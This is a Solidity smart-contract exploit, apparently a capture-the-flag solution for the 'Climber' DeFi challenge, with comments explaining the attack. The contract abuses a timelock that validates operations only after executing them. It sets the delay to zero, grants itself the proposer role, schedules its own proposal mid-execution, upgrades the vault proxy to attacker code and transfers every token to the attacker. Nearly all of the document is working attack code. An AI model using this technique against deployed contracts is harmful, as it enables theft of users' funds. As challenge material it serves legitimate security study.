// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./ClimberTimelock.sol";
import "./ClimberVault.sol";
import "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";

contract ClimberAttack is UUPSUpgradeable {
    ClimberTimelock immutable timelock;
    address immutable vaultProxyAddress;
    IERC20 immutable token;
    address immutable attacker;

    constructor(
        ClimberTimelock _timelock,
        address _vaultProxyAddress,
        IERC20 _token
    ) {
        timelock = _timelock;
        vaultProxyAddress = _vaultProxyAddress;
        token = _token;
        attacker = msg.sender;
    }

    function buildProposal()
        internal
        view
        returns (
            address[] memory,
            uint256[] memory,
            bytes[] memory
        )
    {
        address[] memory targets = new address[](5);
        uint256[] memory values = new uint256[](5);
        bytes[] memory dataElements = new bytes[](5);

        // Update delay to 0
        targets[0] = address(timelock);
        values[0] = 0;
        dataElements[0] = abi.encodeWithSelector(
            ClimberTimelock.updateDelay.selector,
            0
        );

        // Grant this contract the proposer role
        targets[1] = address(timelock);
        values[1] = 0;
        dataElements[1] = abi.encodeWithSelector(
            AccessControl.grantRole.selector,
            timelock.PROPOSER_ROLE(),
            address(this)
        );

        // Call this contract to schedule the proposal
        targets[2] = address(this);
        values[2] = 0;
        dataElements[2] = abi.encodeWithSelector(
            ClimberAttack.scheduleProposal.selector
        );

        // Upgrade the Proxy to use this contract as implementation instead
        targets[3] = address(vaultProxyAddress);
        values[3] = 0;
        dataElements[3] = abi.encodeWithSelector(
            UUPSUpgradeable.upgradeTo.selector,
            address(this)
        );

        // Now sweep the funds
        targets[4] = address(vaultProxyAddress);
        values[4] = 0;
        dataElements[4] = abi.encodeWithSelector(
            ClimberAttack.sweepFunds.selector
        );

        return (targets, values, dataElements);
    }

    // Start explot by executing a proposal that makes us a proposer
    function executeProposal() external {
        (
            address[] memory targets,
            uint256[] memory values,
            bytes[] memory dataElements
        ) = buildProposal();
        timelock.execute(targets, values, dataElements, 0);
    }

    // Timelock calls this while proposal is still being executed but
    // we are a proposer now and can schedule it to make it legit

    function scheduleProposal() external {
        (
            address[] memory targets,
            uint256[] memory values,
            bytes[] memory dataElements
        ) = buildProposal();
        timelock.schedule(targets, values, dataElements, 0);
    }

    // Once this contract became the Vaults Proxys new Logic contract
    // this function will be called to move all tokens to the attacker

    function sweepFunds() external {
        token.transfer(attacker, token.balanceOf(address(this)));
    }

    // Required function for inheriting from UUPSUpgradeable
    function _authorizeUpgrade(address newImplementation) internal override {}
}

// The Timelock contract itself is added as an administrator.
// Although the ADMIN_ROLE is seemingly unused in the Timelock,
// there are actually several public functions that it's inheriting from AccessControl,
// most importantly: grantRole(bytes32 role, address account).
// So it should be possible to grant roles via a proposal, since they are executed by this contract which is an admin.

// While the schedule function can only be called by proposers the execute function has an interesting comment:
// The execute function does indeed check that the operation state of a given ID must be ReadyForExecution, it does so after executing the function calls.
// That means we're free to do all the calls we want as long as we ensure that at the end of them there is an operation that is actually marked as ReadyForExecution
// So we know that, since the contract is an admin, we can simply grant us the PROPOSER_ROLE as well and then schedule the proposal we're
// already executing before the operation state check is made.

// In Summary, we have to execute a proposal that doesn't exist and make sure that at the end of its execution it does exist
// after all and was ready to be executed. If we manage this we've basically taken control of the owner of the Vault.

// But in order to drain all of the tokens at once, we need to be the sweeper,
// and there's currently no external function that allows changing who that is after initialization
// Good thing though that, as the owner, we're able to upgrade the Logic Contract to whatever we want!

// And we do that by calling upgradeTo(address newImplementation) which is a function that ClimberVault inherits from UUPSUpgradeable.

// 0 Update delay to 0
// 1 Grant this contract the proposer role.
// 2 Call this contract to schedule the proposal.
// 3 Upgrade the Proxy to use this contract as implementation instead.
// 4 Now sweep the funds!
